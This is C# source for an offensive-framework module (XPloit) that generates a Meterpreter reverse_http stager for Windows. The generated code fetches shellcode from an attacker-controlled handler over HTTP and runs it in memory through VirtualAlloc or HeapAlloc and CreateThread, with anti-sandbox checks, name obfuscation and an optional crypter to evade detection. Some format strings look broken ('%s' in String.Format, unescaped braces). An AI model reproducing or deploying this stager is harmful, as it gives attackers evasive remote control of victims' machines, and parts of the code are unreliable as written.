using System;
using XPloit.Core;
using XPloit.Core.Attributes;
using XPloit.Core.Charset;
using XPloit.Core.Enums;
using XPloit.Helpers;
using XPloit.Helpers.Attributes;
using Payloads.Evasion;

namespace Payloads.Remote.Windows.cs.Meterpreter
{
    [ModuleInfo(Author = "Teeknofil", Description = "Custom-written pure c# meterpreter/reverse_http stager.")]
    public class rev_http : Payload
    {
        #region Configure
        public override EArquitecture Arquitecture { get { return EArquitecture.x86; } }
        public override EPlatform Platform { get { return EPlatform.Windows; } }
        #endregion

        #region Properties
        [ConfigurableProperty(Description = "IP of the Metasploit handler")]
        public string LHOST { get; set; }

        [ConfigurableProperty(Description = "Port of the Metasploit handler")]
        public string LPORT { get; set; }

        [ConfigurableProperty(Description = "Compile to an executable")]
        public bool COMPILE_TO_EXE { get; set; }
        [ConfigurableProperty(Description = "Virtual or Heap")]
        public string INJECT_METHOD { get; set; }
        [ConfigurableProperty(Description = "Use the crypter")]
        public bool USE_ENCRYPTION { get; set; }
        [ConfigurableProperty(Description = "Optional: Payloads expire after \"Y\" days")]
        public bool EXPIRE_PAYLOAD { get; set; }
        [ConfigurableProperty(Description = "Optional: Required system hostname")]
        public string HOSTNAME { get; set; }
        [ConfigurableProperty(Description = "Optional: Required internal domain")]
        public string DOMAIN { get; set; }
        [ConfigurableProperty(Description = "Minimum number of processors")]
        public string PROCESSORS { get; set; }
        [ConfigurableProperty(Description = "Optional: The required user account")]
        public string USERNAME { get; set; }
        [ConfigurableProperty(Description = "Check to validate not in UTC")]
        public bool TIMEZONE { get; set; }
        [ConfigurableProperty(Description = "Check if debugger is attached")]
        public bool DEBUGGER { get; set; }
        [ConfigurableProperty(Description = "Sleep \"Y\" seconds, check if accelerated")]
        public string SLEEP { get; set; }
        [ConfigurableProperty(Description = "Uses basic variable renaming obfuscation :\n\n\t\t\t ==CHARACTER OBFUSCATION== \n\t\t\t none,\n\t\t\t auto,\n\t\t\t lalpha,\n\t\t\t ualpha,\n\t\t\t mixalpha,\n\t\t\t sv-lalpha,\n\t\t\t sv-ualpha,\n\t\t\t sv-mixalpha,\n\t\t\t lcyrillic,\n\t\t\t ucyrillic,\n\t\t\t mixcyrillic,\n\t\t\t mix.\n")]
        public string OBFUSCATION { get; set; }
        #endregion

        public rev_http()
        {         
            
            LPORT = "8080";
            COMPILE_TO_EXE = false;
            USE_ENCRYPTION = false;
            INJECT_METHOD = "Virtual";
            EXPIRE_PAYLOAD = false;
            HOSTNAME = null;
            DOMAIN = null;
            PROCESSORS = "2";
            USERNAME = null;
            TIMEZONE = true;
            DEBUGGER = true;
            OBFUSCATION = "auto";
            Random rnd = new Random();
            SLEEP = rnd.Next(15, 22).ToString();
        }

        private bool Run()
        {
            string payload_code = null;

            // imports and namespace setup
            payload_code += "using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices; using System.Threading;\n";
            payload_code += String.Format("namespace {0}", Evasion_helpers.Variable("Meterpreter", OBFUSCATION.ToLower()));
            payload_code += "{";
            payload_code += String.Format("class {0}", Evasion_helpers.Variable("ReverseHTTP", OBFUSCATION.ToLower()));
            payload_code += "{\n";

            // code for the randomString() function
            string Buffer = Evasion_helpers.Variable("Buffer", OBFUSCATION.ToLower());
            string buffer = Evasion_helpers.Variable("buffer", OBFUSCATION.ToLower());
            string chars = Evasion_helpers.Variable("chars", OBFUSCATION.ToLower());
            string t = StringHelper.RandomUniqString(62, Latin.AlphabetMixCase("mixalpha-numeric"));

            payload_code += String.Format("static string %s(Random r, int s) {\n", Buffer);
            payload_code += String.Format("char[] {0} = new char[s];\n", buffer);
            payload_code += String.Format("for (int i = 0; i < s; i++){{0}[i] = {1}[r.Next({2}.Length)];}\n", buffer, chars, chars);
            payload_code += String.Format("return new string({0});}\n", buffer);

            // code for the checksum8() function
            string checksum8 = Evasion_helpers.Variable("Checksum8", OBFUSCATION.ToLower());
            payload_code += String.Format("static bool {0}(string s)", checksum8); 
            payload_code += "{ return ((s.ToCharArray().Select(x => (int)x).Sum()) %% 0x100 == 92);}\n";

            // code fo the genHTTPChecksum() function
            string genHTTPChecksum = Evasion_helpers.Variable("genHTTPChecksum", OBFUSCATION.ToLower());
            string baseString = Evasion_helpers.Variable("baseString", OBFUSCATION.ToLower());
            string randChars = Evasion_helpers.Variable("randChars", OBFUSCATION.ToLower()) + StringHelper.RandomUniqString(62, Latin.AlphabetMixCase("mixalpha-numeric"));
            string url = Evasion_helpers.Variable("url", OBFUSCATION.ToLower().ToLower());

            payload_code += String.Format("static string {0}(Random r)", genHTTPChecksum); 
            payload_code += "{";
            payload_code += String.Format("string {0} = \"\";\n",baseString);
            payload_code += "for (int i = 0; i < 64; ++i)";
            payload_code += "{";
            payload_code += String.Format(" {0} = {1}(r, 3);\n", baseString, Buffer);
            payload_code += String.Format("string {0} = new string(\"{1}\".ToCharArray().OrderBy(s => (r.Next(2) %% 2) == 0).ToArray());\n", randChars, randChars);
            payload_code += String.Format("for (int j = 0; j < {0}.Length; ++j) {\n", randChars);
            payload_code += String.Format("string {0} = {1} + {2}[j];\n", url, baseString, randChars);
            payload_code += String.Format("if ({0}({1}))" , checksum8, url);
            payload_code += "{";
            payload_code += String.Format("return {0};", url); 
            payload_code += "}}}";
            payload_code += "return \"9vXU\";";
            payload_code += "}\n";

            // code for getData() function
            string getData = Evasion_helpers.Variable("getData", OBFUSCATION.ToLower());
            string str = Evasion_helpers.Variable("str", OBFUSCATION.ToLower());
            string webClient = Evasion_helpers.Variable("webClient", OBFUSCATION.ToLower());
            string s = Evasion_helpers.Variable("s", OBFUSCATION.ToLower());

            payload_code += String.Format("static byte[] {0}(string {1})", getData, str);
            payload_code += "{\n";
            payload_code += String.Format("WebClient {0} = new System.Net.WebClient();\n", webClient);
            payload_code += String.Format("{0}.Headers.Add(\"User-Agent\", \"Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)\");\n",webClient);
            payload_code += String.Format("{0}.Headers.Add(\"Accept\", \"*/*\");\n", webClient);
            payload_code += String.Format("{0}.Headers.Add(\"Accept\", \"*/*\");\n", webClient);
            payload_code += String.Format("{0}.Headers.Add(\"Accept-Language\", \"en-gb,en;q=0.5\");\n", webClient);
            payload_code += String.Format("{0}.Headers.Add(\"Accept-Charset\", \"ISO-8859-1,utf-8;q=0.7,*;q=0.7\");\n", webClient);
            payload_code += String.Format("byte[] {0} = null;\n", s);
            payload_code += "try {\n";
            payload_code += String.Format("{0} = {1}.DownloadData({2});\n", s, webClient, str);
            payload_code += String.Format("if ({0}.Length < 100000) return null;}\n", s);
            payload_code += "catch (WebException) {}\n";
            payload_code += String.Format("return %s;", s);
            payload_code += "}\n";

            // code fo the inject() function to inject shellcode
            string inject = Evasion_helpers.Variable("inject", OBFUSCATION.ToLower());
            s = Evasion_helpers.Variable("s", OBFUSCATION.ToLower());
            string funcAddr = Evasion_helpers.Variable("funcAddr", OBFUSCATION.ToLower());
            string hThread = Evasion_helpers.Variable("hThread", OBFUSCATION.ToLower());
            string threadId = Evasion_helpers.Variable("threadId", OBFUSCATION.ToLower());
            string pinfo = Evasion_helpers.Variable("pinfo", OBFUSCATION.ToLower());

            if (INJECT_METHOD.ToLower() == "virtual")
            {
                payload_code += String.Format("static void {0}(byte[] {1})", inject,s);
                payload_code += "{\n";
                payload_code += String.Format("    if ({0} != null)", s); 
                payload_code += "{\n";
                payload_code += String.Format("        UInt32 {0} = VirtualAlloc(0, (UInt32){1}.Length, 0x1000, 0x40);\n", funcAddr, s);
                payload_code += String.Format("        Marshal.Copy({0}, 0, (IntPtr)({1}), {2}.Length);\n", s, funcAddr,s);
                payload_code += String.Format("        IntPtr {0} = IntPtr.Zero;\n", hThread);
                payload_code += String.Format("        UInt32 {0} = 0;\n", hThread);
                payload_code += String.Format("        IntPtr {0} = IntPtr.Zero;\n", pinfo);
                payload_code += String.Format(" {0} = CreateThread(0, 0, {1}, {2}, 0, ref {3});\n", hThread, funcAddr, pinfo, threadId);
                payload_code += String.Format("        WaitForSingleObject({0}, 0xFFFFFFFF); }}\n", hThread);
            }
            else if (INJECT_METHOD.ToLower() == "heap")
            {
                payload_code += String.Format("static void {0}(byte[] {1})", inject, s);
                payload_code += "{\n";
                payload_code += String.Format("    if ({0} != null)", s);
                payload_code += "{\n";
                payload_code += String.Format("       UInt32 {0} = HeapCreate(0x00040000, (UInt32){1}.Length, 0);\n", pinfo,s);
                payload_code += String.Format("        UInt32 {0} = HeapAlloc({1}, 0x00000008, (UInt32){2}.Length);\n",  funcAddr, pinfo, s);
                payload_code += String.Format("       RtlMoveMemory({0}, {1}, (UInt32){2}.Length);\n", funcAddr, s, s);
                payload_code += String.Format("       UInt32 {0} = 0;\n;\n", threadId);
                payload_code += String.Format("       IntPtr {0} = CreateThread(0, 0, {1}, IntPtr.Zero, 0, ref {2});;\n", hThread, funcAddr, threadId);
                payload_code += String.Format("       WaitForSingleObject({0}, 0xFFFFFFFF);}}}}\n", hThread);

            }

            return false;
        }
        

    }
}
